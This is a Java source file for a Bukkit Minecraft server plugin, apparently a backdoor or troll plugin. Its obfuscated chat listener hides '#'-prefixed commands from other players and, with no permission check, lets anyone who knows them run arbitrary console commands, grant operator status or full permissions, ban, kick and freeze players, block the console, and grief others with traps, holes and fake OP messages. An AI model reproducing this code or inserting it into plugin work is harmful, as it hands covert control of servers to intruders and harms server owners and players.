package com.Skype;

import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.ItemStack;

public class C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$ implements Listener{

	private Main plugin;

	
	
	public C$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$2$$$$$$$$$$$$$$$$(Main main) {
		this.plugin = main;
		plugin.getServer().getPluginManager().registerEvents(this, main);
	}
	@EventHandler
	public void Chat(PlayerChatEvent e){
		Player P$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = e.getPlayer();
		String MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$ = e.getMessage();
		if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#freeze") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Freeze")){
			e.setCancelled(true);
			if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
				P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Freeze §7[§e(NAME) §8| §cALL§7]");
			}else{
				String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
				if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
					for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
					if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
						
					}else{
					Main.$$$$$$$$$$$$$$$$$$$$$$$$$01$$$$$$.add($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
					}
					}
				}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
					P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
				}else{
					Main.$$$$$$$$$$$$$$$$$$$$$$$$$01$$$$$$.add(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
				}
			}
			}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#jumpscare") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Jumpscare")){
				e.setCancelled(true);
				if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
					P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Jumpscare §7[§e(NAME) §8| §cALL§7]");
				}else{
					String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
					if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
						for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
							if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
								
							}else{
							JS$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$.jumpscare($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
							}
						}
					}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
						P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
					}else{
						JS$$$$$$$$$$$$$$$$$$7$$$$$$$$$$$$$$$$.jumpscare(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
					}
				}
				}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#destroy") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Destroy")){
					e.setCancelled(true);
					if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
						P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Destroy §7[§e(NAME) §8| §cALL§7]");
					}else{
						String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
							for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
								if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
									
								}else{
									LA$$$$$$$$$$$$$$$$$$$$$u$$$$$$$$$$$$$$$$$$.Destroy($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
								}
							}
						}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
						}else{
							LA$$$$$$$$$$$$$$$$$$$$$u$$$$$$$$$$$$$$$$$$.Destroy(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
						}
					}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#cycrash") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#CyCrash")){
						Main.PS$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add(P$$$$$$$$$$$$$$$$$$$$$$$$$$$$);
						e.setCancelled(true);
						o.Infos(P$$$$$$$$$$$$$$$$$$$$$$$$$$$$);
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#writeas") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#WriteAs")){
						e.setCancelled(true);
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 3){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#WriteAs §7[§e(NAME)§7] [§a(Nachricht)§7]");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ")[1].equals("konsole")){
								String $$$ms$$$$$$$$ = "";
								for(int i = 2; i < $$$$$PLS$$$$$$$$$$$$$$$.length; i++ ){
									$$$ms$$$$$$$$ =  $$$ms$$$$$$$$ + $$$$$PLS$$$$$$$$$$$$$$$[i] + " ";
								}
								Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "" + $$$ms$$$$$$$$);	
							}else{
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								String $$$ms$$$$$$$$ = "";
								for(int i = 2; i < $$$$$PLS$$$$$$$$$$$$$$$.length; i++ ){
									$$$ms$$$$$$$$ =  $$$ms$$$$$$$$ + $$$$$PLS$$$$$$$$$$$$$$$[i] + " ";
								}
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).chat("" + $$$ms$$$$$$$$);
							}
						  }
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#shuffleinv") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#ShuffleInv")){
						e.setCancelled(true);	
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#ShuffleInv §7[§e(NAME)§7] ");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								List<ItemStack> solution = new ArrayList<>();
								for (ItemStack i : Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getInventory().getContents())
								{
									if(i != null){
								    solution.add(i);
									}
								}
								Collections.shuffle(solution);
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getInventory().clear();
								for(ItemStack $$$Dhi$$$$ : solution){
									if($$$Dhi$$$$ != null){
										Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getInventory().addItem($$$Dhi$$$$);
									}
								}
								
								
							}
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#trap") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Trap")){
						e.setCancelled(true);	
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Trap §7[§e(NAME)§7] ");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								Main.BF$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendBlockChange(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().add(0, 2, 0), Material.DIAMOND_BLOCK, (byte) 0);
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendBlockChange(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().add(2, -1, 0), Material.DIAMOND_BLOCK, (byte) 0);
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendBlockChange(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().add(0, -1, 0), Material.DIAMOND_BLOCK, (byte) 0);
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendBlockChange(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().add(1, -1, 1), Material.DIAMOND_BLOCK, (byte) 0);
							}
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#jump") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Jump")){
						e.setCancelled(true);	
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Jump §7[§e(NAME)§7] ");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).setVelocity(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getVelocity().setY(4.0D));
							}
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#hole") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Hole")){
						e.setCancelled(true);	
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Hole §7[§e(NAME)§7] ");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								double Height = Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().getY();
								while(Height > -1){
									Location $$$$$$$$$$$$$d$$$$$$$$$$ = new Location(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().getWorld(), Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().getX(), Height, Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getLocation().getZ());
									$$$$$$$$$$$$$d$$$$$$$$$$.getBlock().setType(Material.AIR);
									$$$$$$$$$$$$$d$$$$$$$$$$.getBlock().setType(Material.WEB);
									Height --;
								}
							}
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#fakeop") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#FakeOP")){
						e.setCancelled(true);	
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#FakeOP §7[§e(NAME)§7] ");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendMessage("§eYou are OP now");
								Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).sendMessage("§7§o[Server: " + Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getName() + " wurde zum Operator ernannt]");
							}
						}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#blockcmd")){
						e.setCancelled(true);
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length < 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#BlockCMD §7[§eSpieler | Konsole§7]  ");
						}else{
						String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
						if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("konsole")){
							if(Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ == false){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §cKonsole blockiert");
								Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = true;
							}else{
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §aKonsole freigegeben");
								Main.c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = false;
							}
						}else{
						if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
						}else{
							
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §aBefehle von " + Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getName() + " geblockt!");
							Main.Bl$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
							
						}
					}
		}
					}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#nosprint") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#NoSprint")){
						e.setCancelled(true);
						if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
							P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#NoSprint §7[§e(NAME) §8| §cALL§7]");
						}else{
							String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
							if($$$$$PLS$$$$$$$$$$$$$$$[1].equals("ALL")){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7Sprinten global §cdeaktiviert");
								for(Player $$$$$$$$$$$$$$uhe$$$$$$$$$$$$ : Bukkit.getOnlinePlayers()){
									if($$$$$$$$$$$$$$uhe$$$$$$$$$$$$ == P$$$$$$$$$$$$$$$$$$$$$$$$$$$$){
										
									}else{
										Main.Spri$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add($$$$$$$$$$$$$$uhe$$$$$$$$$$$$);
									}
								}
							}else if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
							}else{
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7Sprinten für " +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cdeaktiviert");
								Main.Spri$$$$$$$$$$$$$$$$$$$$$$$03$$$$$$.add(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]));
							}
						}
						}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#pex") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#PEX")){
							e.setCancelled(true);
							if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
								P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#PEX §7[§e(Player)§7]");
							}else{
								String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
								if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
									P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
								}else{
									P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7Rechte für " +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cregistriert");
									Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).getName() + " add *");
								}
							}
							}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#op") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#OP")){
								e.setCancelled(true);
								if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
									P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#op §7[§e(Player)§7]");
								}else{
									String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
									if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
									}else{
										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7OP-Rechte für " +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cregistriert");
										Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).setOp(true);
									}
								}
								}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#ban")|| MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Ban")){
									e.setCancelled(true);
									if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
										P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Ban §7[§e(Player)§7]");
									}else{
										String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
										if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
											P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
										}else{
											P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7Ban für " +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cregistriert");
											Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).setBanned(true);
											Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).kickPlayer("");
										}
									}
									}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#kick") || MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#Kick")){
										e.setCancelled(true);
										if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ").length != 2){
											P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §a#Kick §7[§e(Player)§7]");
										}else{
											String[] $$$$$PLS$$$$$$$$$$$$$$$ = MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.split(" ");
											if(Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]) == null){
												P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §c" + $$$$$PLS$$$$$$$$$$$$$$$[1] + " §7nicht gefunden!");
											}else{
												P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.sendMessage("§bSkype: §7" +  P$$$$$$$$$$$$$$$$$$$$$$$$$$$$.getName()  + " §cgekickt");
												Bukkit.getPlayer($$$$$PLS$$$$$$$$$$$$$$$[1]).kickPlayer("");
											}
										}
										}else if(MSG$$$$$$$$$$$$$$$$$$$677$$$$$$$$$$$$.startsWith("#motd")){
										Main.moc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ = true;	
										}
	}
		
		
	}
